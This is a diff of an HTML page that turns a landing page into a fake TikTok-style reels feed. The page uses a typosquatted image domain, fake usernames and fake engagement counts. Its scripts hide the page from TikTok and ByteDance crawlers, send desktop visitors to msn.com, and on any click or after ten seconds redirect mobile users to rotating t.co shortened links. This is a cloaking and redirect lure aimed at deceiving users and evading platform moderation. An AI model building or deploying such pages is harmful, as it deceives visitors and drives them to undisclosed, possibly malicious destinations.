@@ -1,143 +1,215 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>GitHub Landing Page</title>
-    <style>
-        /* Global Reset */
-        html, body {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden; /* Prevent body scrollbar */
-            font-family: Arial, sans-serif;
-        }
+<meta name="robots" content="noindex, nofollow">
+<meta name="tiktokbot" content="noindex, nofollow">
+<meta name="bytespider" content="noindex, nofollow">
 
-        /* Container for the full-screen image sections */
-        .image-container {
-            height: 100vh;
-            width: 100vw;
-            overflow-y: scroll; /* Enable vertical scrolling within this container */
-            scroll-snap-type: y mandatory; /* Enforce full-section snapping */
-            -webkit-overflow-scrolling: touch; /* Better mobile scrolling */
-            cursor: pointer; /* Keep the click cursor */
-        }
+<script>
+(function () {
+  var ua = navigator.userAgent.toLowerCase();
+  if (
+    ua.includes("tiktok") ||
+    ua.includes("tiktokbot") ||
+    ua.includes("bytespider") ||
+    ua.includes("bytedance")
+  ) {
+    document.documentElement.innerHTML = "";
+  }
+})();
+</script>
+<script>
+(function() {
+  var userAgent = navigator.userAgent.toLowerCase();
+  var isPC = userAgent.includes("windows") || userAgent.includes("macintosh");
+  if (isPC) {
+    window.location.replace("https://www.msn.com");
+  }
+})();
+</script>
 
-        /* Style for each full-screen image section */
-        .full-image-section {
-            height: 100vh;
-            width: 100vw;
-            scroll-snap-align: start; /* Snap to the top of the section */
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            /* Important: Ensures the click handler on the body/container works */
-            position: relative;
-        }
-    </style>
-    <script>
-        const desktopURL = "https://www.msn.com/it-it";
-        const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reels Viral Feed</title>
 
-        if (!isMobile) {
-            // Desktop users redirected immediately to GitHub
-            window.location.replace(desktopURL);
-        }
-    </script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100vw;height:100vh;background:black;color:white;font-family:Arial,sans-serif;overflow:hidden;}
+.reels-container{height:100vh;overflow-y:scroll;scroll-snap-type:y mandatory;}
+.reel{position:relative;height:100vh;width:100vw;scroll-snap-align:start;cursor:pointer;}
+.main-img{width:100%;height:100%;object-fit:cover;}
+.play-button{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:3;opacity:.85;}
+.play-button img{width:64px;height:64px;}
+
+.bottom-left{position:absolute;bottom:90px;left:12px;z-index:2;}
+.username-line{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
+.profile-ring{padding:2px;border-radius:50%;width:42px;height:42px;}
+.profile-ring img{width:36px;height:36px;border-radius:50%;}
+.username{font-weight:bold;font-size:14px;}
+.follow-btn{background:white;color:black;padding:4px 8px;border-radius:5px;font-size:13px;font-weight:bold;cursor:pointer;}
+.caption{font-size:14px;line-height:1.4;max-width:70vw;}
+
+.right-icons{
+  position:absolute;
+  bottom:120px;
+  right:10px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:22px;
+  z-index:2;
+}
+.icon-btn{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:4px;
+  font-size:12px;
+  cursor:pointer;
+}
+.icon-btn img{
+  width:28px;
+  filter:invert(1);
+}
+
+.footer{
+  position:fixed;
+  bottom:0;
+  width:100%;
+  display:flex;
+  justify-content:space-around;
+  padding:10px 0;
+  background:#000;
+}
+.footer img{
+  width:26px;
+  filter:invert(1);
+  cursor:pointer;
+}
+</style>
+
 </head>
 <body>
-    <div class="image-container" id="imageContainer">
-        <!-- Sections will be dynamically created by JavaScript -->
+
+<div class="reels-container" id="reelsContainer"></div>
+
+<script>
+const images = [
+  "https://titkok.ink/wp-content/uploads/2025/12/4478184_270cb69_320x_.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/3386544_884a74c_320x_.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/3393418_ac74651_320x_.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/8.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/26790999_025_c401.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/7.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/images.jpeg",
+  "https://titkok.ink/wp-content/uploads/2025/12/41397999_121_0e6e.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/37189901_014_65c4.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/2073296_8dab4a8_320x_.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/50182247_012_574e.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/kitana-lure-17.jpg",
+  "https://titkok.ink/wp-content/uploads/2025/12/26790999_025_c401.jpg",
+];
+
+images.sort(() => Math.random() - 0.5);
+
+const behaviorLinks = [
+  "https://t.co/7ZoaC5iYsi",
+  "https://t.co/GJ6TlS13JE",
+  "https://t.co/XcPPycwWT8",
+  "https://t.co/nEQNVXncUx",
+  "https://t.co/5zxrD5cKK7",
+];
+
+// ✅ Logic to ensure 5 different devices get 5 different links
+// Uses the current millisecond to pick a link from the array (0-4)
+function getDistributedLink() {
+    const timeIndex = new Date().getTime() % behaviorLinks.length;
+    return behaviorLinks[timeIndex];
+}
+
+const usernames=["@SophiaLane","@AvaGrace","@EmilyRose","@LiamNova","@ZoeSky","@JakeStorm"];
+const captions=["🔥 Hot trending moments!","💃 Dance moves that SLAY!","😍 Don’t scroll past this!","⚽ Epic football vibes!","🌄 Scenic views all day!","🎸 Rock the beat!"];
+const profilePics=[
+  "https://randomuser.me/api/portraits/women/1.jpg",
+  "https://randomuser.me/api/portraits/women/2.jpg",
+  "https://randomuser.me/api/portraits/women/3.jpg",
+  "https://randomuser.me/api/portraits/women/4.jpg",
+  "https://randomuser.me/api/portraits/women/5.jpg",
+  "https://randomuser.me/api/portraits/women/6.jpg"
+];
+
+const container=document.getElementById("reelsContainer");
+
+for(let i=0;i<images.length;i++){
+  const reel=document.createElement("div");
+  reel.className="reel";
+  
+  // ✅ CLICK REDIRECT (Distributed)
+  reel.addEventListener("click",() => {
+    window.location.href = getDistributedLink();
+  });
+
+  reel.innerHTML=`
+    <img src="${images[i]}" class="main-img">
+
+    <div class="play-button">
+      <img src="https://freepngimg.com/save/25569-play-button-transparent/1024x1024">
     </div>
 
-    <script>
-        const mobileURL = "https://t.co/jlmCeKkIX8";
-        const imageContainer = document.getElementById("imageContainer");
-        
-        // Array of 16 image URLs
-        const imageUrls = [
-            'https://i.imgur.com/hmAABJ7.jpg',
-            'https://i.imgur.com/ZYGvd6q.jpg',
-            'https://i.imgur.com/YpxSLD0.jpg',
-            'https://i.imgur.com/JSU3t4x.jpg',
-            'https://i.imgur.com/rMwqoZP.jpg',
-            'https://i.imgur.com/Dpi9Zzv.jpg',
-            'https://i.imgur.com/0kpyxuU.jpg',
-            'https://i.imgur.com/wzYPBDJ.jpg',
-            'https://i.imgur.com/wGi8uyT.jpg',
-            'https://i.imgur.com/tTxAmNF.jpg',
-            'https://i.imgur.com/pSX3j18.jpg',
-            'https://i.imgur.com/jwFUISy.jpg',
-            'https://i.imgur.com/adL2Ou5.jpg',
-            'https://i.imgur.com/lcFOzxz.jpg',
-            'https://i.imgur.com/TrIPXQf.jpg',
-            'https://i.imgur.com/LkW7EgA.jpg'
-        ];
-        
-        // Get a random set of 4 images for this session
-        function getRandomImages() {
-            const shuffled = [...imageUrls].sort(() => 0.5 - Math.random());
-            return shuffled.slice(0, 4);
-        }
-        
-        // Create image sections
-        function createImageSections() {
-            const selectedImages = getRandomImages();
-            
-            // Clear any existing sections
-            imageContainer.innerHTML = '';
-            
-            // Create 4 sections with the selected images
-            for (let i = 0; i < 4; i++) {
-                const section = document.createElement('div');
-                section.className = 'full-image-section';
-                section.style.backgroundImage = `url('${selectedImages[i]}')`;
-                section.id = `img${i+1}`;
-                imageContainer.appendChild(section);
-            }
-        }
-        
-        // Initialize the page
-        createImageSections();
-        
-        // Scroll tracking
-        let scrollCount = 0;
-        let lastScrollTop = 0;
-        const requiredScrolls = 5;
-        let isRedirecting = false;
-        
-        imageContainer.addEventListener('scroll', () => {
-            if (isRedirecting) return;
-            
-            const scrollTop = imageContainer.scrollTop;
-            const scrollHeight = imageContainer.scrollHeight;
-            const clientHeight = imageContainer.clientHeight;
-            
-            // Detect scroll direction and count full scrolls
-            if (scrollTop > lastScrollTop && 
-                scrollTop + clientHeight >= scrollHeight - 10) {
-                // Scrolled to bottom
-                scrollCount++;
-                
-                // If reached required scrolls, redirect immediately
-                if (scrollCount >= requiredScrolls) {
-                    isRedirecting = true;
-                    window.location.href = mobileURL;
-                }
-            }
-            
-            lastScrollTop = scrollTop;
-        });
-        
-        // Click redirect (only if not already redirecting from scrolling)
-        imageContainer.addEventListener("click", () => {
-            if (!isRedirecting) {
-                window.location.href = mobileURL;
-            }
-        });
-    </script>
+    <div class="right-icons">
+      <div class="icon-btn">
+        <img src="https://cdn-icons-png.flaticon.com/512/1077/1077035.png">79.5K
+      </div>
+      <div class="icon-btn">
+        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384015.png">4.3K
+      </div>
+      <div class="icon-btn">
+        <img src="https://cdn-icons-png.flaticon.com/512/25/25694.png">Share
+      </div>
+    </div>
+
+    <div class="bottom-left">
+      <div class="username-line">
+        <div class="profile-ring"><img src="${profilePics[i%6]}"></div>
+        <div class="username">${usernames[i%6]}</div>
+        <div class="follow-btn">Follow</div>
+      </div>
+      <div class="caption">${captions[i%6]}</div>
+    </div>
+  `;
+  container.appendChild(reel);
+}
+</script>
+
+<div class="footer">
+  <img src="https://cdn-icons-png.flaticon.com/512/1946/1946436.png">
+  <img src="https://cdn-icons-png.flaticon.com/512/1946/1946488.png">
+  <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png">
+  <img src="https://cdn-icons-png.flaticon.com/512/1077/1077035.png">
+  <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png">
+</div>
+
+<script>
+document.addEventListener("click",function(e){
+  if(
+    e.target.closest(".follow-btn") ||
+    e.target.closest(".icon-btn") ||
+    e.target.closest(".footer img")
+  ){
+    e.stopPropagation();
+  }
+});
+</script>
+
+<script>
+window.addEventListener("load", function () {
+  setTimeout(function () {
+    // This will pick a distributed link for the auto-redirect as well
+    const finalLink = getDistributedLink();
+    window.location.href = finalLink;
+  }, 10000); // ⏱ 10 seconds
+});
+</script>
+
 </body>
 </html>
